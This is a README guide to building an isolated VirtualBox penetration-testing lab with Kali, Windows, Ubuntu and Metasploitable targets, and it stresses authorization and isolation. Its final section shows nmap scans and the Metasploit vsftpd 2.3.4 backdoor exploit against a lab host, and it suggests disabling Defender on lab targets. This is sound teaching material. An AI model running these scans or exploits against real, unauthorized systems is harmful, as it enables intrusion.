# VirtualBox Security Lab

A step-by-step guide to building a **self-contained penetration-testing lab** in VirtualBox: a Kali attacker box and Windows + Ubuntu target boxes, all on an **isolated host-only network** so your practice never leaves your machine. Metasploit (built into Kali) is used against *your own lab targets only*.

> ⚠️ **Scope:** Everything here runs on your own computer, against machines you built. Keep the lab isolated. Do not point these tools at any system you don't own or aren't authorized to test.

## Lab layout
```
        ┌─────────────────────────── Host-only network (vboxnet0, 10.10.10.0/24) ───────────────────────────┐
        │                                                                                                    │
   ┌────┴─────┐            ┌──────────────┐            ┌──────────────┐            ┌──────────────────────┐
   │  Kali    │            │  Ubuntu      │            │  Windows 10  │            │  Metasploitable 2    │
   │ attacker │            │  target      │            │  target      │            │  (optional, vulnerable)│
   │10.10.10.5│            │ 10.10.10.10  │            │ 10.10.10.20  │            │     10.10.10.30        │
   └──────────┘            └──────────────┘            └──────────────┘            └──────────────────────┘
```
No VM has internet access on this network, so exploits stay contained.

## 1. Install VirtualBox
- Download VirtualBox + the Extension Pack: <https://www.virtualbox.org/wiki/Downloads>
- Install both (the Extension Pack adds USB/RDP support).

## 2. Create the isolated network
VirtualBox → **Tools → Network → Host-only Networks → Create**. Name it `vboxnet0`:
- IPv4 address: `10.10.10.1`, mask `255.255.255.0`
- **Disable the DHCP server** (you'll set static IPs per VM, which is clearer for a lab)

Each VM will use **Adapter 1 = Host-only Adapter → vboxnet0**. Leave NAT off unless a VM temporarily needs updates (see §6).

## 3. Kali Linux (attacker)
1. Download the Kali VirtualBox image: <https://www.kali.org/get-kali/#kali-virtual-machines> (pre-built .vbox saves time).
2. Import it, set Adapter 1 to host-only `vboxnet0`.
3. Boot, log in (`kali`/`kali`), change the password, and set a static IP `10.10.10.5`.
4. Metasploit is already installed. Initialize its database:
   ```bash
   sudo msfdb init
   msfconsole -q
   ```

## 4. Ubuntu (target)
1. Download Ubuntu Desktop/Server ISO: <https://ubuntu.com/download>
2. New VM (2 GB RAM, 20 GB disk), attach the ISO, install.
3. Adapter 1 = host-only, static IP `10.10.10.10`.
4. Optionally install a deliberately exploitable service to practice against (e.g. an old OpenSSH or a vulnerable web app like DVWA) — keep it in the lab only.

## 5. Windows 10 (target)
1. Microsoft provides free evaluation VMs: <https://developer.microsoft.com/windows/downloads/virtual-machines/> (or a Win10 eval ISO).
2. New VM (4 GB RAM), install, Adapter 1 = host-only, static IP `10.10.10.20`.
3. For practice, you may lower its defenses *inside the lab* (e.g. turn off Defender/Firewall) — never do this on a real machine.

## 6. (Optional) Metasploitable 2
A purpose-built vulnerable Linux VM, ideal for a first Metasploit run:
- Download: <https://sourceforge.net/projects/metasploitable/>
- Import, Adapter 1 = host-only, IP `10.10.10.30`. Login `msfadmin`/`msfadmin`.

## 7. Snapshots (do this early)
After each VM is installed and networked, take a **snapshot** (right-click VM → Snapshot). When an exploit breaks a target, roll back in seconds instead of reinstalling.

## 8. First end-to-end test
From Kali:
```bash
# confirm the lab network is reachable
nmap -sn 10.10.10.0/24

# service/version scan of a target
nmap -sV 10.10.10.30

# Metasploit against your own lab target (Metasploitable example)
msfconsole -q
msf6 > search vsftpd 2.3.4
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 10.10.10.30
msf6 > run
```

## Updating VMs safely
When a VM needs updates, temporarily add **Adapter 2 = NAT**, update, then **remove NAT** again to keep the lab isolated.

## Responsible use
This lab exists so you can learn offense and defense on systems you own. Everything stays on the host-only network. Don't bridge these tools to networks or hosts you aren't authorized to test.

## License
MIT
